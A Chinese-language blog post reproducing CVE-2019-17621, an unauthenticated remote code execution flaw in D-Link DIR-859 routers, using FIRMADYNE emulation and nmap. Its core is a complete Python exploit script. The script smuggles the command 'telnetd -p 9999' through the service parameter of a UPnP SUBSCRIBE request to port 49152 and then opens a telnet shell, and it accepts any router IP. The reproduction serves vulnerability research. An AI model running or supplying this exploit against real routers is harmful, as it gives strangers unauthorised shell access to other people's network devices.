<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>利用FIRMADYNE全仿真系统模拟路由器固件运行，可以自己参照firmadyne使用步骤写利用脚本，也可以利用知世师傅写的<a href="https://github.com/nightRainy/Auxiliary_tools/blob/master/iot/fastrun.py" target="_blank" rel="noopener">脚本</a>或者利用firmadyne的自动化利用工具 <a href="https://github.com/attify/firmware-analysis-toolkit" target="_blank" rel="noopener">firmware-analysis-toolkit</a> 中的./fat.py将固件模拟运行起来。</p>
<p><img src="dir859.png" alt=""></p>
<p>随后利用nmap进行扫描firmadynew为路由器配置的默认IP地址<code>192.168.0.1</code>发现，该主机确实存活并且开启了4个端口(53DNS端口、80HTTP端口、443HTTPS端口、49152应该是upnp端口)</p>
<p><img src="nmap.png" alt=""></p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>这是研究员Miguel Mendez Z.的<a href="https://github.com/s1kr10s/D-Link-DIR-859-RCE/blob/master/reverseshell-SUBSCRIBE.py" target="_blank" rel="noopener">EXP</a>脚本。</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> socket
<span class="token keyword">import</span> os
<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep
<span class="token keyword">def</span> <span class="token function">httpSUB</span><span class="token punctuation">(</span>server<span class="token punctuation">,</span> port<span class="token punctuation">,</span> shell_file<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n[*] Connection {host}:{port}'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>host<span class="token operator">=</span>server<span class="token punctuation">,</span> port<span class="token operator">=</span>port<span class="token punctuation">)</span>
    con <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
    request <span class="token operator">=</span> <span class="token string">"SUBSCRIBE /gena.cgi?service="</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>shell_file<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" HTTP/1.0\n"</span>
    request <span class="token operator">+=</span> <span class="token string">"Host: "</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>server<span class="token punctuation">)</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>port<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span>
    request <span class="token operator">+=</span> <span class="token string">"Callback: &lt;http://192.168.0.4:34033/ServiceProxy27>\n"</span>
    request <span class="token operator">+=</span> <span class="token string">"NT: upnp:event\n"</span>
    request <span class="token operator">+=</span> <span class="token string">"Timeout: Second-1800\n"</span>
    request <span class="token operator">+=</span> <span class="token string">"Accept-Encoding: gzip, deflate\n"</span>
    request <span class="token operator">+=</span> <span class="token string">"User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\n\n"</span>

    sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[*] Sending Payload'</span><span class="token punctuation">)</span>
    con<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>socket<span class="token punctuation">.</span>gethostbyname<span class="token punctuation">(</span>server<span class="token punctuation">)</span><span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>
    con<span class="token punctuation">.</span>send<span class="token punctuation">(</span>request<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    results <span class="token operator">=</span> con<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>

    sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[*] Running Telnetd Service'</span><span class="token punctuation">)</span>
    sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[*] Opening Telnet Connection\n'</span><span class="token punctuation">)</span>
    sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'telnet '</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>server<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' 9999'</span><span class="token punctuation">)</span>

serverInput <span class="token operator">=</span> raw_input<span class="token punctuation">(</span><span class="token string">'IP Router: '</span><span class="token punctuation">)</span>
portInput <span class="token operator">=</span> <span class="token number">49152</span> <span class="token comment" spellcheck="true">#upnp端口</span>

httpSUB<span class="token punctuation">(</span>serverInput<span class="token punctuation">,</span> portInput<span class="token punctuation">,</span> <span class="token string">'`telnetd -p 9999 `'</span><span class="token punctuation">)</span></code></pre>
<p>运行EXP结果如下：</p>
<p><img src="poc.png" alt=""></p>
<p>nmap扫描发现打开了9999端口，并能够在未授权的情况下获取路由器的shell。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://medium.com/@s1kr10s/d-link-dir-859-rce-unautenticated-cve-2019-17621-en-d94b47a15104" target="_blank" rel="noopener">https://medium.com/@s1kr10s/d-link-dir-859-rce-unautenticated-cve-2019-17621-en-d94b47a15104</a></p>
<p><a href="https://nightrainy.github.io/2020/02/25/DIR-859-RCE分析-CVE-2019–17621复现/" target="_blank" rel="noopener">https://nightrainy.github.io/2020/02/25/DIR-859-RCE%E5%88%86%E6%9E%90-CVE-2019%E2%80%9317621%E5%A4%8D%E7%8E%B0/</a> </p>
<p><a href="https://www.ibm.com/developerworks/cn/linux/other/UPnP/part1/index.html" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/linux/other/UPnP/part1/index.html</a> </p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>iot</category>
      </categories>
      <tags>
        <tag>d-link</tag>
        <tag>dir-859</tag>
      </tags>
  </entry>
</search>
